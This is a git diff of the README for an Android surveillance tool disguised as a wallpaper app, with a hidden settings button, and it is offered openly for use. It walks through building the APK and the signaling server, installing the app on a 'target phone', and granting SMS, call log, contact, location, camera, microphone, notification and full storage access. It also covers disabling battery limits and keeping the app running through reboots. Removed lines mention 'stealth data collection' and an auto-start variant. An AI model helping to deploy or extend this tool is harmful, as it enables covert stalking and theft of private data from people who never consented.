@@ -1,509 +1,264 @@
-# 📱 Android Wallpaper & WebRTC Streaming App
+# 📱 Advanced Android WebRTC Security & Remote Administration Tool (RAT)
 
 <div align="center">
-  <img src="./SpywareDashboard.gif" alt="App Demo" width="100%" />
+  <img src="./SpywareDashboard.gif" alt="Control Panel Demo" width="100%" />
 </div>
 
 <div align="center">
-  <h3>🎨 Wallpaper Customization + 📡 Real-time Device Monitoring</h3>
-  <p><em>A powerful dual-purpose Android application combining aesthetic customization with comprehensive device streaming capabilities</em></p>
+  <h3>🎨 Wallpaper Personalization + 📡 Glassmorphic Remote Surveillance Control Room</h3>
+  <p><em>A dual-purpose Android application combining seamless aesthetic customization with advanced WebRTC-based real-time telemetry, remote administration, and media streaming.</em></p>
 </div>
 
 ---
 
-## 🌟 Overview
+## ⚖️ Legal & Ethical Disclaimer
 
-This innovative Android application serves a **dual purpose**: it allows users to select and set stunning wallpapers on their device while simultaneously enabling **real-time streaming** of multiple device features to a web browser using **WebRTC technology**. 
+> [!CAUTION]
+> **This tool is developed for educational, system diagnostic, security research, and authorized monitoring purposes only.**
+> Streaming camera feeds, microphone audio, reading SMS/call logs, monitoring notifications, tracking GPS coordinates, or executing remote operations without the explicit knowledge and consent of the device owner is illegal. The user is entirely responsible for compliance with all local, federal, and international privacy laws. The author assumes no liability for misuse of this project.
 
-The app leverages **Socket.IO** for signaling to establish secure peer-to-peer connections, making it perfect for:
-- 🔍 **Remote monitoring Spyware** and device management
-- 📱 **Live demonstrations** and presentations  
-- 📊 **Real-time data streaming** (SMS, calls, location, notifications)
-- 🎨 **Device personalization** with wallpapers
+---
 
-> **Key Technology**: WebRTC ensures low-latency, high-quality streaming directly between your Android device and web browser without intermediate servers processing your data.
+## 🌟 Architectural Overview
 
-> ⚖️ **Use responsibly**: Streaming camera, audio, SMS, call logs, notifications, and location data may be restricted by law. **Obtain informed consent** from the device owner and comply with all applicable regulations and platform policies.
+This system utilizes a hybrid peer-to-peer and client-server architecture:
+1. **Android Client (Java/Kotlin Interoperability)**: Runs a persistent, foreground-priority streaming service that hooks into device hardware (Camera2 API, AudioRecord, LocationManager, SensorManager, ClipboardManager, PackageManager).
+2. **Node.js Signaling Server**: Facilitates low-latency signaling exchanges (SDP/ICE candidates) using Socket.IO, manages administrative uploads, and routes remote commands.
+3. **Glassmorphic Web Dashboard**: A premium, real-time control room built with fluid glassmorphism, responsive controls, canvas-based sensor charts, and live media pipelines.
 
-## 🔀 Branch Variants
+```
+       ┌────────────────┐
+       │   Web Browser  │◄─── Audio/Video Streams (P2P via WebRTC) ───┐
+       │ (Control Panel)│                                              │
+       └───────┬────────┘                                              │
+               │                                                       │
+         Socket.IO Signaling                                           │
+               │                                                       │
+               ▼                                                       │
+       ┌────────────────┐                                      ┌───────┴────────┐
+       │ Signaling &    │                                      │  Android App   │
+       │ Admin Server   │◄──── Commands, Telemetry, Uploads ───┤(Streaming Serv)│
+       └────────────────┘                                      └────────────────┘
+```
 
-This repository has two maintained variants:
+---
 
-- **main** (you’re here): standard app with a **manual Streaming toggle** in *Streaming Settings*. Includes the **Node.js signaling server** in `Android-WebRTC-Spyware-Server/`.
-- **autostream**: headless variant that **starts streaming automatically** after install and permission grant — **no manual toggle/UI step**. Ideal for kiosk/demo setups where you want hands-free bring-up.
+## ✨ Features Breakdown
 
-➡️ Looking for auto-start behavior? Use the **autostream** branch:  
-https://github.com/DhruvAthaide/Android_WebRTC_Spyware/tree/autostream
+### 🎥 1. Advanced Live Camera Streaming & Snapshot Capture
+* **Dual-Camera Feeds**: Streams front and back cameras concurrently (on devices with concurrent camera access support running Android 9+).
+* **Hot-Swappable Resolutions**: Change camera resolution on-the-fly (e.g., Low, Medium, High) from the dashboard to optimize bandwidth.
+* **Single-Frame Snapshots**: Instantly capture and download high-resolution snapshots from any camera without interrupting the WebRTC stream.
 
-## ✨ Features
+### 🎤 2. Two-Way Intercom (Walkie-Talkie Mode)
+* **Bidirectional Talkback**: Send audio from the web dashboard browser microphone directly to the device speaker while receiving the device's room audio.
+* **Audio Routing**: Utilizes WebRTC transceivers configured in `SEND_RECV` mode and routes through the Android `AudioManager` using `MODE_IN_COMMUNICATION`.
 
-### 📷 **Advanced Camera Streaming**
-- 📹 **High-Quality Video**: Streams camera feed at 640x480 resolution
-- 🔄 **Dual Camera Support**: 
-  - Front and back cameras displayed **simultaneously** on web dashboard
-  - **Requirements**: Modern Android device + Android 9+ (API 28+)
-  - **Auto-fallback**: Seamlessly switches to single camera on older devices
-- ⚡ **Low Latency**: Real-time streaming with minimal delay
+### 🎛️ 3. Hardware & Environmental Controls
+* **Volume Control**: Change Ring, Media, Alarm, and Notification volumes remotely using sliders.
+* **System Brightness**: Dynamically alter screen brightness level.
+* **Flashlight Switch**: Remotely toggle the device's LED flashlight.
 
-### 🎤 **Premium Audio Streaming**
-- 🎧 **Real-time Transmission**: Live audio feed to web browser
+### 📈 4. Real-Time Ambient Sensor Monitoring
+* **Illuminance Sensor**: Stream ambient light level (Lux) dynamically.
+* **Accelerometer Vectors**: Fetch raw X, Y, Z vector readings.
+* **Live Canvas Charts**: Visualizes incoming sensor values using HTML5 Canvas graphs on the dashboard.
 
-### 📂 **Remote File Explorer**
-- 📂 **Full File System Access**: Browse device storage remotely
-- ⬇️ **Download**: Transfer files from device to PC
-  - ⚡ **Chunked Transfer**: Optimized 64KB chunking for stable large file downloads
-- 🗑️ **Delete**: Remove files remotely
-- 🛡️ **Recovery**: Auto-reconnects file system link if connection drops
+### 🗣️ 5. Text-To-Speech (TTS) Broadcast
+* Synthesizes and plays loud spoken messages on the device.
+* Ideal for remote warnings, broadcast announcements, or accessibility.
 
-### 📱 **Comprehensive Device Monitoring**
-- 💬 **Live SMS Streaming**: Real-time message monitoring and display
-- 📞 **Call Log Tracking**: Complete call history with timestamps
-- 🗺️ **GPS Location Streaming**: Live location tracking with interactive map display
-- 🔔 **Notification Monitoring**: Real-time notification feed from all apps
-- 🔄 **Auto-Persistence**: Service auto-restarts on boot and app swipe-away
+### 📂 6. Remote File System Explorer & Drag-and-Drop Uploader
+* **Directory Navigator**: Browse directories, view file metadata, and download files.
+* **Chunked Large File Downloads**: Employs reliable 64KB chunking to download large files securely.
+* **Drag-and-Drop Uploader**: Drag files into the dashboard to write them directly onto the device storage using base64-chunked data packets.
 
-### 🌐 **Advanced WebRTC Technology**
-- 🔐 **Peer-to-Peer Streaming**: Direct device-to-browser connection
-- 🛡️ **STUN/TURN Support**: Reliable connection through NAT/firewall traversal
-- ⚡ **Ultra-Low Latency**: Optimized for real-time performance
-- 🔄 **Auto-Reconnection**: Intelligent connection recovery
+### 📋 7. Remote Clipboard Synchronizer
+* **Get Clipboard**: Retrieve current text copied on the device.
+* **Set Clipboard**: Remotely write new text to the device clipboard.
+* *Note: Subject to background clipboard restrictions on Android 10+, handled gracefully via UI thread execution.*
 
+### 🚀 8. App Launch Manager
+* List all installed user and system applications with package names.
+* Search through apps instantly and launch them remotely with a single click.
 
-### ⚙️ **Dynamic Signaling Server (IP/Port) Configuration**
-- ✍️ **hange IP/Port at runtime** from the app’s Streaming Settings page. The current server URL is stored in SharedPreferences.
-- 🧭 **Invisible Settings Button**: The settings button in the top-right corner is intentionally invisible but clickable. Tap the top-right area to open Streaming Settings.
-- 🌐 **No ```network_security_config.xml``` required**: The app allows cleartext globally (debug/dev friendly). You do not need to list every IP or edit an XML.
+### 🔋 9. Diagnostics & Telemetry Dashboard
+* **Power Diagnostics**: Real-time battery percentage, temperature, health, and charging status (AC/USB/Wireless).
+* **Network Speed & Quality**: Read current WiFi RSSI (signal strength), Link Speed, and SSID.
+* **Storage Monitor**: Shows total, used, and free space in system and external storage.
+* **Location Tracking**: Plots live GPS/Network coordinates onto an interactive map.
+* **Personal Data Feeds**: Access real-time SMS messages, Call Logs, Contacts, and incoming push notifications.
 
-### 💻 **Interactive Web Dashboard**
-- 📊 **Real-time Status Updates**: Live connection and streaming status
-- 🎮 **Responsive Interface**: Works seamlessly across all modern browsers
-- 🎯 **Centralized Control**: All device streams in one comprehensive dashboard
+---
 
-## 🏗️ Project Architecture
+## 📦 Project Structure
 
 ```
 📦 Android_WebRTC_Spyware/
 ├── 📱 app/
 │   ├── 📝 src/main/java/com/example/wallpaperapplication/
-│   │   ├── 🚀 BootReceiver.java              # Auto-start functionality
-│   │   ├── ✅ ConsentActivity.java           # Permission management
-│   │   ├── ⚙️ Constants.java                 # App configuration
-│   │   ├── 🏠 MainActivity.java              # Main wallpaper interface
-│   │   ├── 🔗 SdpObserverAdapter.java        # WebRTC SDP handling
-│   │   ├── 📡 StreamingService.java          # Core streaming service
-│   │   ├── ⚙️ StreamingSettingsActivity.java # Streaming controls
-│   │   └── 🎨 WallpaperAdapter.java          # Wallpaper grid manager
-│   ├── 📋 src/main/AndroidManifest.xml       # App permissions & config
-│   └── 🔧 build.gradle.kts                   # Build configuration
+│   │   ├── 🚀 BootReceiver.java              # Boot-up service auto-restarter
+│   │   ├── ✅ ConsentActivity.java           # Permission & terms manager
+│   │   ├── ⚙️ Constants.java                 # Socket events & signaling configuration
+│   │   ├── 🏠 MainActivity.java              # Main wallpaper customization interface
+│   │   ├── 🔗 SdpObserverAdapter.java        # WebRTC signaling observer helper
+│   │   ├── 📡 StreamingService.java          # Core service handling sensors, media & sockets
+│   │   ├── ⚙️ StreamingSettingsActivity.java # Settings panel for configuring servers & permissions
+│   │   ├── 🎨 WallpaperAdapter.java          # Wallpaper gallery grid recycler view
+│   │   ├── 🛠️ CameraManager.kt               # Kotlin manager for Camera2 and snapshots
+│   │   ├── 📂 FileSystemExtension.kt         # Kotlin helper for writing upload file chunks
+│   │   └── 🔄 DataSyncWorker.java            # Periodic background Sync fallback
+│   ├── 📋 src/main/AndroidManifest.xml       # Permissions, services, receivers, and metadata
+│   └── 🔧 build.gradle.kts                   # Gradle build definitions and dependencies
 ├── 🖥️ Android-WebRTC-Spyware-Server/
-│   ├── ⚡ server.js                          # Node.js signaling server
-│   ├── 📦 package.json                       # Server dependencies
+│   ├── ⚡ server.js                          # Express & Socket.IO telemetry and signaling server
+│   ├── 📦 package.json                       # Node dependencies and execution scripts
 │   └── 🌐 public/
-│       ├── 🎨 index.html                     # Web dashboard UI
-│       └── 🔧 client.js                      # Browser WebRTC client
-└── 📖 README.md                              # This documentation
+│       ├── 🎨 index.html                     # Premium Glassmorphic Web Dashboard UI
+│       └── 🔧 client.js                      # WebRTC connection, canvas charts & dashboard handlers
+└── 📖 README.md                              # Systems documentation
 ```
-
-### 🔧 **Core Components Explained**
-
-| Component | Purpose | Key Features |
-|-----------|---------|--------------|
-| **🏠 MainActivity.java** | Wallpaper interface entry point | Grid view, wallpaper preview, system integration |
-| **🎨 WallpaperAdapter.java** | Wallpaper gallery management | RecyclerView optimization, image loading, selection handling |
-| **📡 StreamingService.java** | Heart of streaming functionality | WebRTC initialization, multi-stream capture, signaling |
-| **⚙️ StreamingSettingsActivity.java** | User control interface | Permission requests, stream toggles, settings management |
-| **🚀 BootReceiver.java** | Auto-start Logic | Restarts service on device boot |
-| **🔄 DataSyncWorker.java** | Background Sync | Periodic stealth data collection using WorkManager |
-| **🔒 AndroidManifest.xml** | Security & permissions | Camera, microphone, location, SMS permissions |
-| **⚡ server.js** | WebRTC signaling hub | Socket.IO management, peer connection facilitation |
-| **🎨 index.html & 🔧 client.js** | Web dashboard | Stream display, real-time updates, user interface |
-
-## 📋 Prerequisites
-
-### 📱 **Android Development**
-- 💻 **Android Studio**: Latest version recommended (Arctic Fox+)
-- 🛠️ **Android SDK**: 
-  - **Minimum**: API 21+ (Android 5.0)
-  - **Recommended**: API 28+ (Android 9.0) for dual camera support
-- 📱 **Test Device**: Physical device or emulator with camera and microphone
-- 🔄 **Dual Camera Requirements**: 
-  - Modern Android device with concurrent camera access support
-  - Android 9+ (API level 28+)
-  - Multiple camera sensors capable of simultaneous streaming
-
-### 🖥️ **Server Environment**
-- 🟢 **Node.js**: Version 16.x or higher
-- 📦 **npm**: Version 8.x or higher
-- 💾 **Storage**: Minimal requirements (< 100MB)
-
-### 🌐 **Browser Compatibility**
-- ✅ **Chrome**: Version 80+ (Recommended)
-- ✅ **Firefox**: Version 75+ 
-- ✅ **Safari**: Version 13+
-- ✅ **Edge**: Version 80+
-- 📱 **Mobile browsers**: Full WebRTC support required
-
-### 🌐 **TURN Server Access**
-- 🔐 **Credentials**: Valid numb.viagenie.ca account (or alternative TURN provider)
-- 🏠 **Local Network**: Devices on same network for optimal performance
-- 🌍 **Remote Access**: TURN server required for cross-network connections
-
-### 🔧 **Network Configuration**
-- 📡 **Default Server IP**: Configure the Server IP Address by following the steps given below
-- 🔌 **Port**: 3000 (configurable)
-- 🛡️ **Firewall**: Ensure ports are accessible between devices
-- ⚡ **Bandwidth**: Minimum 2 Mbps for smooth streaming
-
-## 🚀 Quick Setup Guide
-
-> Prefer auto-start streaming with no UI toggle? Switch to the **autostream** branch.
-
-### 1️⃣ **Clone & Initialize**
-```bash
-# Clone the repository
-git clone https://github.com/DhruvAthaide/Android_WebRTC_Spyware.git
-cd Android_WebRTC_Spyware
-
-# Verify project structure
-ls -la
-```
-
-### 2️⃣ **Configure Android Application**
-
-#### 📱 **Open in Android Studio**
-1. Launch Android Studio
-2. Open the `Android_WebRTC_Spyware` project
-3. Wait for Gradle sync to complete
-
-#### 🔧 **Update Dependencies** 
-Verify `app/build.gradle.kts` contains all required dependencies for WebRTC and UI components.
-
-#### 🔐 **Configure TURN Server Credentials**
-In `StreamingService.java`, replace placeholders with your actual credentials (Optional):
-```java
-ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
-    .setUsername("your-actual-username")      // 🔑 Replace with real username
-    .setPassword("your-actual-password")      // 🔑 Replace with real password
-    .createIceServer());
-```
-
-#### 🌐 **Update Server Configuration**
-**In `StreamingService.java`**:
-```java
-private static final String SIGNALING_URL = "http://YOUR_SERVER_IP:3000";  // 🔧 Update IP
-```
-
-#### ✅ **Verify Permissions**
-Ensure `AndroidManifest.xml` includes all necessary permissions for streaming and wallpaper functionality.
 
 ---
 
-### 3️⃣ **Setup Signaling Server**
+## 🚀 Setup & Installation Instructions
 
-#### 📁 **Navigate to Server Directory**
+This section outlines how to set up the Firebase integration, compile the APK, run the signaling server, and pair the device.
+
+### 1️⃣ Firebase Integration (CRITICAL)
+
+The application relies on Google Firebase services for authentication, notification triggers, and telemetry synchronization. 
+
+> [!IMPORTANT]
+> **Do NOT commit your `google-services.json` to any public repository!** 
+> If committed, anyone can steal your API keys, run up database bills, or compromise your connected devices. A safety rule has been added to [app/.gitignore](file:///d:/AndroidStudioProjects/WallpaperApplication/app/.gitignore) to prevent accidental pushes.
+
+#### How to set up Firebase for your project:
+1. Go to the [Firebase Console](https://console.firebase.google.com/).
+2. Click **Add Project** and follow the prompts to create a new project.
+3. In your project overview, click the **Android icon** to add an Android app.
+4. Enter the Package Name: `com.example.wallpaperapplication`.
+5. Enter your debug SHA-1 signing certificate fingerprint (optional but recommended for security).
+   * *To get your debug SHA-1, open a terminal in the project directory and run `./gradlew signingReport`.*
+6. Register the app, then click **Download google-services.json**.
+7. Copy the downloaded `google-services.json` file and place it inside the **`app/`** directory of this project:
+   * Path: `Android_WebRTC_Spyware/app/google-services.json`
+8. In the Firebase Console, go to **Build → Realtime Database** or **Firestore** (depending on your logging needs) and enable it.
+9. Under **Project Settings → API Keys**, make sure to add constraints to restrict your credentials to only run requests from your application package.
+
+---
+
+### 2️⃣ Configure and Launch the Signaling Server
+
+The Node.js server serves as the communication bridge between the browser dashboard and the Android client.
+
+#### Navigate to Server:
 ```bash
 cd Android-WebRTC-Spyware-Server
 ```
 
-#### 📦 **Install Dependencies**
+#### Install Dependencies:
+Make sure you have Node.js 16+ installed. Install the server requirements:
 ```bash
-npm install express socket.io@4.7.5
+npm install
 ```
 
-#### 🔐 **Configure Client-Side TURN**
-In `public/client.js`, update TURN server credentials (Optional):
+#### Configure Server WebRTC Settings (Optional):
+Open `public/client.js` and verify/update your Ice/TURN settings. By default, standard Google STUN servers are configured:
 ```javascript
 const config = {
   iceServers: [
     { urls: 'stun:stun.l.google.com:19302' },
-    { 
-      urls: 'turn:numb.viagenie.ca', 
-      username: 'your-actual-username',    // 🔑 Replace with real username
-      credential: 'your-actual-password'   // 🔑 Replace with real password
-    }
+    { urls: 'stun:stun1.l.google.com:19302' }
+    // Add your TURN servers here if accessing the server outside your local network:
+    // { urls: 'turn:YOUR_TURN_SERVER', username: 'username', credential: 'password' }
   ]
 };
 ```
 
-#### 🌐 **Update Socket.IO URL**
-```javascript
-const socket = io('http://YOUR_SERVER_IP:3000');  // 🔧 Update IP
-```
-
----
-
-### 4️⃣ **Launch the Server**
+#### Start the Server:
 ```bash
-# Start the signaling server
+# Run server
 node server.js
-
-# Expected output:
-# ✅ Server running at http://localhost:3000 or http://<Your Server IP Address>:3000
-# 🔌 Socket.IO initialized and ready
 ```
+The server will boot and display:
+```
+✅ Signaling Server started on port 3000
+```
+To access the Web Dashboard, navigate to `http://<YOUR_SERVER_IP_ADDRESS>:3000` (e.g. `http://localhost:3000` if local).
 
 ---
 
-### 5️⃣ **Build & Deploy Android App**
+### 3️⃣ Configure and Compile the Android APK
 
-#### 🔨 **Build Process**
-1. In Android Studio: **Build → Make Project**
-2. Resolve any dependency issues
-3. Ensure all configurations are properly set
+#### Configure the Signaling Endpoint
+1. Open the project in **Android Studio**.
+2. Open [Constants.java](file:///d:/AndroidStudioProjects/WallpaperApplication/app/src/main/java/com/example/wallpaperapplication/Constants.java).
+3. Update `DEFAULT_SOCKET_URL` to point to your Signaling Server's IP address:
+   ```java
+   public static final String DEFAULT_SOCKET_URL = "http://192.168.1.100:3000"; // Replace with your local/public server IP
+   ```
 
-#### 📱 **Installation & Usage**
-1. **Deploy**: Run app on Android device or emulator (API 21+)
-2. **Wallpaper Mode**: 
-   - Browse wallpaper gallery on main screen
-   - Tap wallpaper to preview
-   - Apply to home/lock screen
-3. **Streaming Mode**:
-   - Navigate to streaming settings
-   - Toggle streaming **ON**
-   - Grant all requested permissions:
-     - 📷 Camera access
-     - 🎤 Microphone access  
-     - 📍 Location access
-     - 💬 SMS access
-     - 📞 Phone access
-     - 🔔 Notification access
-     - 💾 **Manage External Storage** (Android 11+ for File Explorer)
+#### Build the APK
+* **Via Android Studio UI**: Click **Build → Build Bundle(s) / APK(s) → Build APK(s)**.
+* **Via Terminal**: Run the Gradle wrapper script in the root project folder:
+  ```powershell
+  # Windows Powershell
+  .\gradlew assembleDebug
+  
+  # Linux/macOS
+  ./gradlew assembleDebug
+  ```
+The generated APK will be available at:
+`app/build/outputs/apk/debug/app-debug.apk`
 
 ---
 
-### 6️⃣ **Access Web Dashboard**
+## 📱 Device Setup & Permissions
+
+To ensure all background features, sensors, media streams, and file syncs work properly without getting killed by Android's aggressive energy-saver mechanisms, perform the following steps on the target phone:
+
+1. **Install the APK** on the target device.
+2. Open the application. Tap the **invisible Settings icon** in the top-right corner of the main screen to enter the **Streaming Settings** menu.
+3. Turn the **Streaming Toggle ON**. The app will request permissions:
+   * **Camera**: For live streams and snapshot capture.
+   * **Microphone**: For audio streaming and two-way talkback.
+   * **Location**: For real-time GPS tracking.
+   * **Contacts, SMS, Call Logs**: For fetching phone lists and monitoring SMS.
+   * **Storage / All Files Access**: Required on Android 11+ to browse and download/upload files from the File Explorer.
+4. **Disable Battery Optimization**:
+   * Go to **Settings → Apps → Wallpaper Application → Battery**.
+   * Change optimization level to **Unrestricted** (prevents Android from killing the background service).
+5. **Enable Notification Listener Access**:
+   * Go to **Settings → Security & Privacy → Special App Access → Notification Listener Access**.
+   * Turn access **ON** for the app to allow the dashboard to capture incoming notifications.
+
+---
+
+## ⚙️ Persistent Background Strategy
+
+To keep the telemetry streaming service active even when the application is swiped away from memory or if the system undergoes a reboot:
+* **Foreground Service**: The app starts a high-priority foreground service with a persistent system tray notification.
+* **Boot Restart Receiver**: The `BootReceiver` captures the `ACTION_BOOT_COMPLETED` broadcast, launching the service immediately upon system start.
+* **WorkManager Fallback**: A periodic sync worker (`DataSyncWorker`) runs every 15 minutes as a fallback constraint. If the system forcefully shuts down the main process, WorkManager will restart the service components in the background.
+
+---
+
+## 🐛 Debugging & Troubleshooting
+
+### Android Client Logs
+Monitor the connection lifecycle and errors using ADB:
 ```bash
-# Open in browser:
-http://YOUR_SERVER_IP:3000
-
-# Expected features:
-# 📹 Live camera stream(s)
-# 🎤 Real-time audio
-# 💬 SMS messages
-# 📞 Call logs  
-# 📍 GPS location with map
-# 🔔 Live notifications
-# 📊 Connection status indicators
+# Monitor only streaming service and WebRTC logs
+adb logcat -s StreamingService:V CameraManager:V WebRTC:V
 ```
 
-> 💡 **Pro Tip**: Keep the Android app in the foreground initially to ensure all streams initialize properly. Once connected, you can minimize the app.
-
-## 🔧 Debugging & Troubleshooting
-
-### 📱 **Android Debugging**
-
-#### **Logcat Monitoring**
-```bash
-# Monitor streaming service logs
-adb logcat | grep StreamingService
-
-# Monitor all app logs  
-adb logcat | grep WallpaperApplication
-
-# WebRTC specific logs
-adb logcat | grep WebRTC
-```
-
-**🔍 Key Log Indicators:**
-- ✅ `StreamingService initialized successfully`
-- ✅ `WebRTC PeerConnection established`
-- ❌ `Camera permission denied`
-- ❌ `TURN server authentication failed`
-
-#### **Common Android Issues & Solutions**
-
-| Issue | Symptoms | Solution |
-|-------|----------|----------|
-| **📷 Camera not streaming** | Black screen in web dashboard | Check camera permissions, restart app |
-| **🎤 No audio** | Silent stream | Verify microphone permissions, check device audio |
-| **🔐 Permission errors** | App crashes or features disabled | Grant all permissions in Android settings |
-| **🌐 Connection failed** | "Offline" status in dashboard | Verify server IP, check network connectivity |
+* **No Video Stream**: Check if the camera is already in use by another app, and verify that "Camera Access" is enabled globally in the quick settings panel of Android 12+ devices.
+* **Talkback Audio Not Heard**: Ensure that the browser's microphone permissions are granted and that the device speaker is not muted.
+* **Background Disconnections**: Verify you have exempted the application from Battery Optimization.
 
 ---
-
-### 🖥️ **Server Debugging**
-
-#### **Enhanced Logging**
-```bash
-# Run server with detailed logs
-DEBUG=socket.io* node server.js
-
-# Log to file for analysis
-node server.js > server.log 2>&1
-
-# Monitor real-time connections
-tail -f server.log | grep "Client connected"
-```
-
-**📊 Server Health Indicators:**
-- ✅ `Server running at http://localhost:3000`
-- ✅ `Socket.IO listening for connections`
-- ✅ `Client connected: [socket-id]`
-- ❌ `Port 3000 already in use`
-- ❌ `Failed to bind to address`
-
----
-
-### 🌐 **Browser Debugging**
-
-#### **Developer Console**
-1. Open browser DevTools (F12)
-2. Navigate to **Console** tab
-3. Look for WebRTC connection logs
-
-**🔍 Browser Console Indicators:**
-- ✅ `WebRTC connection established`
-- ✅ `Receiving video stream`
-- ✅ `Socket.IO connected to server`
-- ❌ `Failed to establish peer connection`
-- ❌ `ICE connection failed`
-
-#### **Network Analysis**
-1. **DevTools → Network tab**
-2. **Filter**: WebSocket connections
-3. **Monitor**: Socket.IO signaling messages
-
----
-
-### 🚨 **Advanced Troubleshooting**
-
-#### **Port & Network Issues**
-```bash
-# Check if port 3000 is available
-netstat -tuln | grep 3000
-
-# Test server connectivity
-curl http://YOUR_SERVER_IP:3000
-
-# Kill processes using port 3000
-lsof -ti:3000 | xargs kill -9
-```
-
-#### **WebRTC Connection Analysis**
-```javascript
-// Add to browser console for detailed WebRTC stats
-pc.getStats().then(stats => {
-  stats.forEach(report => {
-    if (report.type === 'candidate-pair' && report.state === 'succeeded') {
-      console.log('✅ ICE Connection Success:', report);
-    }
-  });
-});
-```
-
-#### **TURN Server Verification**
-```bash
-# Test TURN server connectivity
-nslookup numb.viagenie.ca
-
-# Alternative TURN servers for testing:
-# stun:stun.l.google.com:19302
-# stun:stun1.l.google.com:19302
-```
-
-## 📷 Camera Support Details
-
-### 📱 **Single Camera Mode (Default)**
-- ✅ **Compatibility**: Works on all supported Android devices (API 21+)
-- 🔄 **Functionality**: Streams either front or back camera based on user selection
-- ⚡ **Performance**: Optimized for older devices with limited hardware capabilities
-- 🔋 **Battery Efficient**: Lower power consumption for extended streaming sessions
-
-### 📹 **Dual Camera Mode (Advanced)**
-
-#### **💻 System Requirements**
-- 🔧 **Hardware**: Modern Android device with concurrent camera access support
-- 📱 **OS Version**: Android 9+ (API level 28+) 
-- 📷 **Camera Hardware**: Multiple sensors capable of simultaneous streaming
-- 🧠 **Processor**: Sufficient CPU/GPU power for dual stream encoding
-
-#### **✨ Features & Benefits**
-- 🎥 **Simultaneous Streaming**: Both front and back cameras active at once
-- 📊 **Dashboard Display**: Dual camera feeds shown side-by-side in web interface
-- 🔄 **Smart Switching**: Automatic quality adjustment based on network conditions
-- 📱 **Picture-in-Picture**: Configurable layout options for dual stream display
-
-#### **🔍 Device Compatibility Check**
-The app automatically detects dual camera support using:
-```java
-// Pseudo-code for dual camera detection
-if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && 
-    cameraManager.getCameraIdList().length >= 2) {
-    // Enable dual camera mode
-}
-```
-
-## ⚠️ Known Issues & Solutions
-
-### 🔧 **Connection & Network Issues**
-
-| Issue | Symptoms | Root Cause | Solution |
-|-------|----------|------------|----------|
-| **🚫 Connection Failures** | Dashboard shows "Offline" | TURN server/network issues | ✅ Verify TURN credentials<br/>✅ Check firewall settings<br/>✅ Test on same network first |
-| **📡 Intermittent Disconnections** | Frequent reconnections | Unstable network/power saving | ✅ Disable battery optimization<br/>✅ Use 5GHz WiFi if available<br/>✅ Check router QoS settings |
-| **🐌 Slow Streaming** | Laggy video/audio | Bandwidth limitations | ✅ Reduce stream quality<br/>✅ Close other network apps<br/>✅ Use wired connection for server |
-
-### 📱 **Android-Specific Issues**
-
-| Issue | Symptoms | Root Cause | Solution |
-|-------|----------|------------|----------|
-| **📷 Camera Black Screen** | Video shows black | Permission/hardware conflict | ✅ Restart app completely<br/>✅ Check camera permissions<br/>✅ Close other camera apps |
-| **🎤 Audio Not Streaming** | Silent dashboard | Microphone access denied | ✅ Grant microphone permission<br/>✅ Check system audio settings<br/>✅ Test with headphones |
-| **🔄 Dual Camera Failure** | Only one camera works | Hardware/OS limitations | ✅ Verify Android 9+<br/>✅ Check device specifications<br/>✅ Test single camera mode |
-| **⚡ App Crashes** | Unexpected shutdowns | Memory/resource issues | ✅ Restart device<br/>✅ Clear app cache<br/>✅ Update Android WebView |
-
-### 🖥️ **Server & Browser Issues**
-
-| Issue | Symptoms | Root Cause | Solution |
-|-------|----------|------------|----------|
-| **🖥️ Server Won't Start** | Port binding errors | Port already in use | ✅ Kill processes on port 3000<br/>✅ Use alternative port<br/>✅ Check system firewall |
-| **🌐 Browser Compatibility** | Features not working | WebRTC support missing | ✅ Use Chrome/Firefox latest<br/>✅ Enable hardware acceleration<br/>✅ Clear browser cache |
-| **📊 Dashboard Not Loading** | Blank page/errors | JavaScript/network issues | ✅ Check browser console<br/>✅ Disable ad blockers<br/>✅ Try incognito mode |
-
----
-
 
 ## 📜 License
 
-```
-MIT License
-
-Copyright (c) 2026 Android WebRTC Streaming App
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
----
-
-<div align="center">
-
-## 🌟 **Star this repository if you found it helpful!**
-
-### 🤝 **Contributing**
-I welcome any contributions! Please feel free to submit pull requests, report bugs, or suggest new features.
-
-### 📞 **Support**
-🐛 **Bug Reports**: [GitHub Issues](https://github.com/DhruvAthaide/Android_WebRTC_Spyware/issues)
-<br>💬 **Discussions**: [GitHub Discussions](https://github.com/DhruvAthaide/Android_WebRTC_Spyware/discussions)
-
----
-
-*Built with ❤️ by Dhruv Athaideusing Kotlin, WebRTC, Android, and Node.js*
-
-</div>
+This project is licensed under the MIT License. Feel free to modify and build upon this project for educational and research purposes.
